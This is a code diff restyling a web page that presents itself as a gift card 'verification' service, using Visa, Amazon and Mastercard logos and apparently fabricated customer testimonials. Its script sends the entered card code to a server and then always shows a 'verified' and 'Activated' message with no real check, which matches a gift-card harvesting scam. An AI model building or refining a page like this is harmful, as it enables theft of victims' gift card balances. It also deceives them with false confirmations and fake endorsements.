@@ -11,19 +11,25 @@
 body{
   margin:0;
   font-family:system-ui;
-  background:linear-gradient(to bottom,#f8fafc,#eef2ff);
+  background:#f8fafc;
 }
 
 /* NAV */
 .nav{
   display:flex;
   justify-content:space-between;
+  align-items:center;
   padding:20px 40px;
   background:white;
   position:sticky;
   top:0;
+  z-index:100;
 }
-.logo{color:#4f46e5;font-weight:bold}
+.logo{
+  font-weight:bold;
+  color:#4f46e5;
+  font-size:20px;
+}
 .nav button{
   background:#4f46e5;
   color:white;
@@ -34,17 +40,19 @@ body{
 
 /* HERO */
 .hero{
-  padding:90px 20px;
+  padding:80px 20px;
 }
 .hero-inner{
   max-width:1100px;
   margin:auto;
   display:flex;
   align-items:center;
-  gap:50px;
+  justify-content:space-between;
+  gap:40px;
 }
 .hero h1{
   font-size:48px;
+  margin-bottom:10px;
 }
 .hero p{
   color:#555;
@@ -57,15 +65,31 @@ body{
   border:none;
   border-radius:10px;
 }
-.hero img{
+
+/* CARD STACK */
+.cards{
+  position:relative;
   width:320px;
+  height:300px;
+}
+.card-img{
+  position:absolute;
+  width:180px;
+  border-radius:12px;
+  box-shadow:0 20px 40px rgba(0,0,0,0.2);
+}
+.card1{top:0;left:70px;transform:rotate(-10deg)}
+.card2{top:90px;left:0;transform:rotate(8deg)}
+.card3{top:120px;left:130px;transform:rotate(15deg)}
+
+.card-img{
   animation:float 6s ease-in-out infinite;
 }
 @keyframes float{
   50%{transform:translateY(-15px)}
 }
 
-/* SECTIONS */
+/* SECTION */
 .section{
   padding:80px 20px;
 }
@@ -82,15 +106,14 @@ body{
 }
 .card{
   background:white;
-  padding:20px;
+  padding:25px;
   border-radius:12px;
-  box-shadow:0 10px 25px rgba(0,0,0,0.05);
+  box-shadow:0 10px 30px rgba(0,0,0,0.05);
 }
 
 /* TESTIMONIAL SLIDER */
 .slider{
   overflow:hidden;
-  position:relative;
 }
 .slider-track{
   display:flex;
@@ -98,7 +121,7 @@ body{
   animation:scroll 25s linear infinite;
 }
 .testimonial{
-  min-width:250px;
+  min-width:260px;
   background:white;
   padding:20px;
   border-radius:12px;
@@ -110,19 +133,18 @@ body{
 }
 
 /* FORM */
-.container-form{
+.form-box{
   background:white;
-  margin:60px auto;
   padding:25px;
   border-radius:15px;
-  width:90%;
   max-width:400px;
+  margin:40px auto;
   box-shadow:0 10px 30px rgba(0,0,0,0.08);
 }
 input,select{
   width:100%;
   padding:12px;
-  margin-top:8px;
+  margin-top:10px;
   border-radius:8px;
   border:1px solid #cbd5e1;
 }
@@ -135,18 +157,6 @@ button.main{
   border:none;
   border-radius:10px;
 }
-
-/* LOADER */
-.loader{
-  border:4px solid #e2e8f0;
-  border-top:4px solid #4f46e5;
-  border-radius:50%;
-  width:35px;
-  height:35px;
-  margin:40px auto;
-  animation:spin 1s linear infinite;
-}
-@keyframes spin{100%{transform:rotate(360deg)}}
 
 /* MODAL */
 .modal{
@@ -163,12 +173,20 @@ button.main{
   padding:25px;
   border-radius:12px;
   text-align:center;
+  width:300px;
+}
+.info{
+  margin-top:15px;
+  text-align:left;
+  background:#f1f5f9;
+  padding:10px;
+  border-radius:10px;
 }
 
 /* SCROLL ANIMATION */
 .reveal{
   opacity:0;
-  transform:translateY(50px);
+  transform:translateY(40px);
   transition:all 0.8s ease;
 }
 .reveal.active{
@@ -198,12 +216,21 @@ button.main{
 
 <section class="hero">
   <div class="hero-inner">
-    <div>
-      <h1 class="reveal">Validate Your Gift Cards With Confidence</h1>
-      <p class="reveal">Fast, secure and simple verification.</p>
-      <button class="reveal" onclick="scrollToForm()">Verify Now</button>
-    </div>
-    <img class="reveal" src="https://i.imgur.com/6X4YQ9T.png">
+
+```
+<div>
+  <h1 class="reveal">Validate Your Gift Cards With Confidence</h1>
+  <p class="reveal">Fast, simple and secure validation in seconds.</p>
+  <button class="reveal" onclick="scrollToForm()">Verify Now</button>
+</div>
+
+<div class="cards reveal">
+  <img class="card-img card1" src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
+  <img class="card-img card2" src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Amazon_logo.svg">
+  <img class="card-img card3" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+</div>
+```
+
   </div>
 </section>
 
@@ -211,44 +238,42 @@ button.main{
 
 <section class="section">
   <div class="container process">
-    <div class="card reveal"><h3>Enter Details</h3><p>Input your card info</p></div>
-    <div class="card reveal"><h3>Validation</h3><p>System checks instantly</p></div>
-    <div class="card reveal"><h3>Secure</h3><p>Your data stays safe</p></div>
-    <div class="card reveal"><h3>Result</h3><p>Get instant feedback</p></div>
+    <div class="card reveal"><h3>1. Enter Details</h3><p>Input your card info easily.</p></div>
+    <div class="card reveal"><h3>2. Validation</h3><p>System checks instantly.</p></div>
+    <div class="card reveal"><h3>3. Secure</h3><p>Your data is protected.</p></div>
+    <div class="card reveal"><h3>4. Result</h3><p>Instant confirmation.</p></div>
   </div>
 </section>
 
-<!-- TESTIMONIAL SLIDER -->
+<!-- TESTIMONIALS -->
 
 <section class="section">
   <div class="container slider reveal">
     <div class="slider-track">
+      <div class="testimonial"><b>Emily</b><p>Saved me from a fake card</p></div>
+      <div class="testimonial"><b>James</b><p>Very fast and easy</p></div>
+      <div class="testimonial"><b>Olivia</b><p>Looks professional</p></div>
+      <div class="testimonial"><b>Liam</b><p>Works perfectly</p></div>
+      <div class="testimonial"><b>Noah</b><p>Highly recommend</p></div>
+      <div class="testimonial"><b>Ava</b><p>Great experience</p></div>
 
 ```
-  <!-- duplicated for smooth loop -->
+  <!-- duplicate for smooth loop -->
   <div class="testimonial"><b>Emily</b><p>Saved me from a fake card</p></div>
-  <div class="testimonial"><b>James</b><p>Very fast and simple</p></div>
-  <div class="testimonial"><b>Olivia</b><p>Clean interface</p></div>
+  <div class="testimonial"><b>James</b><p>Very fast and easy</p></div>
+  <div class="testimonial"><b>Olivia</b><p>Looks professional</p></div>
   <div class="testimonial"><b>Liam</b><p>Works perfectly</p></div>
   <div class="testimonial"><b>Noah</b><p>Highly recommend</p></div>
   <div class="testimonial"><b>Ava</b><p>Great experience</p></div>
-
-  <div class="testimonial"><b>Emily</b><p>Saved me from a fake card</p></div>
-  <div class="testimonial"><b>James</b><p>Very fast and simple</p></div>
-  <div class="testimonial"><b>Olivia</b><p>Clean interface</p></div>
-  <div class="testimonial"><b>Liam</b><p>Works perfectly</p></div>
-  <div class="testimonial"><b>Noah</b><p>Highly recommend</p></div>
-  <div class="testimonial"><b>Ava</b><p>Great experience</p></div>
-
 </div>
 ```
 
   </div>
 </section>
 
-<!-- FORM (YOUR ORIGINAL STRUCTURE KEPT SIMPLE) -->
+<!-- FORM -->
 
-<div id="formSection" class="container-form">
+<div id="formSection" class="form-box reveal">
   <h2>Check Card Status</h2>
 
   <select id="cardType">
@@ -265,20 +290,23 @@ button.main{
 
 </div>
 
-<!-- LOADER -->
-
-<div id="step2" style="display:none">
-  <h2 style="text-align:center;">Verifying...</h2>
-  <div class="loader"></div>
-</div>
-
 <!-- MODAL -->
 
 <div class="modal" id="modal">
   <div class="modal-box">
-    <h2>SUCCESS</h2>
-    <p id="message"></p>
-    <button onclick="closeModal()">Close</button>
+    <h2>Success</h2>
+    <p>Your card has been verified</p>
+
+```
+<div class="info">
+  <p><b>Type:</b> <span id="mType"></span></p>
+  <p><b>Amount:</b> <span id="mAmount"></span></p>
+  <p><b>Status:</b> <span style="color:green;">Activated</span></p>
+</div>
+
+<button onclick="closeModal()">Close</button>
+```
+
   </div>
 </div>
 
@@ -288,7 +316,8 @@ function scrollToForm(){
 }
 
 async function goToVerify(){
-  document.getElementById("step2").style.display="block";
+  const type = document.getElementById("cardType").value;
+  const amount = document.getElementById("amount").value || "0";
 
   await fetch("/api/verify",{
     method:"POST",
@@ -296,10 +325,10 @@ async function goToVerify(){
     body: JSON.stringify({ code: document.getElementById("code").value })
   });
 
-  setTimeout(()=>{
-    document.getElementById("modal").style.display="flex";
-    document.getElementById("message").textContent="Your card has been verified.";
-  },1500);
+  document.getElementById("mType").textContent = type.toUpperCase();
+  document.getElementById("mAmount").textContent = "USD " + amount;
+
+  document.getElementById("modal").style.display="flex";
 }
 
 function closeModal(){
